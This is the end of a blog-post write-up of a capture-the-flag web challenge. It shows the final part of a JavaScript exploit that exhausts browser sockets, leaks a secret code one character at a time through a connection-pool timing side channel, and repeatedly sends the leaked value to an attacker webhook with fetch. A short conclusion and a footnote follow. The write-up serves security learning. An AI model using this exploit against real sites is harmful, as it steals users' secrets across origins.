</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Waiting for font requests...`</span>, <span style="color:#e6db74">&#39;INFO&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Wait until the first font is requested and then free the socket
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">4000</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res_blocker_controller</span>.<span style="color:#a6e22e">abort</span>();
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Starting step 6...`</span>, <span style="color:#e6db74">&#39;INFO&#39;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">32</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>){
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch_step_6</span>(<span style="color:#a6e22e">i</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">done</span>){
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> [<span style="color:#a6e22e">hashmap</span>[<span style="color:#a6e22e">i</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span>], <span style="color:#a6e22e">hashmap</span>[<span style="color:#a6e22e">i</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span>] <span style="color:#f92672">||</span> <span style="color:#e6db74">&#34;A&#34;</span>];
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">main</span>(){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1000</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">exhaust_sockets</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">setTimeout</span>(<span style="color:#66d9ef">async</span> () =&gt; {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">result1</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">leak_char</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`char n.1 guess: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">result1</span>[<span style="color:#ae81ff">1</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, <span style="color:#e6db74">&#39;SUCCESS&#39;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">leaked_code</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">result1</span>[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Leaked code so far </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">leaked_code</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, <span style="color:#e6db74">&#39;INFO&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`{{ webhook }}?token=</span><span style="color:#e6db74">${</span>encodeURIComponent(<span style="color:#a6e22e">leaked_code</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;no-cors&#39;</span>
</span></span><span style="display:flex;"><span>            });
</span></span><span style="display:flex;"><span>        }, <span style="color:#ae81ff">1000</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">setTimeout</span>(<span style="color:#66d9ef">async</span> () =&gt; {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">result1</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">leak_char</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`char n.2 guess: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">result1</span>[<span style="color:#ae81ff">1</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, <span style="color:#e6db74">&#39;SUCCESS&#39;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">leaked_code</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">result1</span>[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Leaked code so far </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">leaked_code</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, <span style="color:#e6db74">&#39;INFO&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`{{ webhook }}?token=</span><span style="color:#e6db74">${</span>encodeURIComponent(<span style="color:#a6e22e">leaked_code</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;no-cors&#39;</span>
</span></span><span style="display:flex;"><span>            });
</span></span><span style="display:flex;"><span>        }, <span style="color:#ae81ff">11000</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">setTimeout</span>(<span style="color:#66d9ef">async</span> () =&gt; {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">result1</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">leak_char</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`char n.3 guess: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">result1</span>[<span style="color:#ae81ff">1</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, <span style="color:#e6db74">&#39;SUCCESS&#39;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">leaked_code</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">result1</span>[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Leaked code so far </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">leaked_code</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, <span style="color:#e6db74">&#39;INFO&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`{{ webhook }}?token=</span><span style="color:#e6db74">${</span>encodeURIComponent(<span style="color:#a6e22e">leaked_code</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;no-cors&#39;</span>
</span></span><span style="display:flex;"><span>            });
</span></span><span style="display:flex;"><span>        }, <span style="color:#ae81ff">21000</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">setTimeout</span>(<span style="color:#66d9ef">async</span> () =&gt; {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">result1</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">leak_char</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`char n.4 guess: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">result1</span>[<span style="color:#ae81ff">1</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, <span style="color:#e6db74">&#39;SUCCESS&#39;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">leaked_code</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">result1</span>[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Leaked code so far </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">leaked_code</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, <span style="color:#e6db74">&#39;INFO&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`{{ webhook }}?token=</span><span style="color:#e6db74">${</span>encodeURIComponent(<span style="color:#a6e22e">leaked_code</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;no-cors&#39;</span>
</span></span><span style="display:flex;"><span>            });
</span></span><span style="display:flex;"><span>        }, <span style="color:#ae81ff">31000</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">setTimeout</span>(<span style="color:#66d9ef">async</span> () =&gt; {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">result1</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">leak_char</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`char n.5 guess: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">result1</span>[<span style="color:#ae81ff">1</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, <span style="color:#e6db74">&#39;SUCCESS&#39;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">leaked_code</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">result1</span>[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Leaked code so far </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">leaked_code</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, <span style="color:#e6db74">&#39;INFO&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`{{ webhook }}?token=</span><span style="color:#e6db74">${</span>encodeURIComponent(<span style="color:#a6e22e">leaked_code</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;no-cors&#39;</span>
</span></span><span style="display:flex;"><span>            });
</span></span><span style="display:flex;"><span>        }, <span style="color:#ae81ff">41000</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">setTimeout</span>(<span style="color:#66d9ef">async</span> () =&gt; {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">result1</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">leak_char</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`char n.6 guess: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">result1</span>[<span style="color:#ae81ff">1</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, <span style="color:#e6db74">&#39;SUCCESS&#39;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">leaked_code</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">result1</span>[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Leaked code so far </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">leaked_code</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, <span style="color:#e6db74">&#39;INFO&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`{{ webhook }}?token=</span><span style="color:#e6db74">${</span>encodeURIComponent(<span style="color:#a6e22e">leaked_code</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;no-cors&#39;</span>
</span></span><span style="display:flex;"><span>            });
</span></span><span style="display:flex;"><span>        }, <span style="color:#ae81ff">51000</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">main</span>();
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
<p>I had a great time creating and solving this challenge! Unfortunately, out of the three solvers, only one solved it as intended. :/</p>
<p>The exploit could be much faster than it currently is. I also want to thank @simonedimaria for helping me with this research and keeping me sane. I’ll probably write another blog post about other findings.</p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p><a href="https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/">https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
</div>
    </article>
  </main>

      </div>
      <footer>
  <hr />
  
    <p id="social">
      Find me around the web:
      <br />
      
        
        <a href="https://github.com/salvatore-abello">Github</a>
      
         | 
        <a href="https://www.linkedin.com/in/salvatore-abello-411b64252/">Linkedin</a>
      
         | 
        <a href="https://www.instagram.com/salvatore.abello/">Instagram</a>
      
    </p>
  
  <p class="copyright">
    Copyright 2025. All rights reserved.
    <hr />
    <code>Made with ❤️ by <strong>Salvatore Abello</strong></code>.
  </p>
</footer>

    </div>
  </body>
</html>
